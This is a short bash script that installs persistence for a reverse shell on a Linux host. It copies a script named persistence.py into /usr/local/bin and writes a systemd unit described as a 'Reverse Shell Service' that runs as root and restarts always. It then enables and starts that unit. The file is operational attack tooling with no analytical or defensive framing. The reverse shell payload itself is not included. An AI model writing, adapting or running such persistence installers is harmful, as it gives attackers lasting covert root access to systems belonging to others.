#!/bin/bash

# Path where the Python script will be copied
TARGET_DIR="/usr/local/bin"

# Install the cryptography package
echo "Installing the cryptography Python package..."
pip install cryptography

# Copy the script to the target directory
echo "Copying persistence.py to $TARGET_DIR..."
cp persistence.py $TARGET_DIR/persistence

# Make the script executable
echo "Setting executable permissions for persistence.py..."
chmod +x $TARGET_DIR/persistence

# Create the systemd service file for persistence.py
echo "Creating systemd service file for persistence.py..."
cat <<EOF > /etc/systemd/system/persistence.service
[Unit]
Description=Reverse Shell Service for persistence.py
After=network.target

[Service]
ExecStart=/usr/bin/python3 $TARGET_DIR/persistence
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
echo "Enabling and starting the persistence service..."
systemctl enable persistence.service
systemctl start persistence.service

echo "Persistence service installed and started."
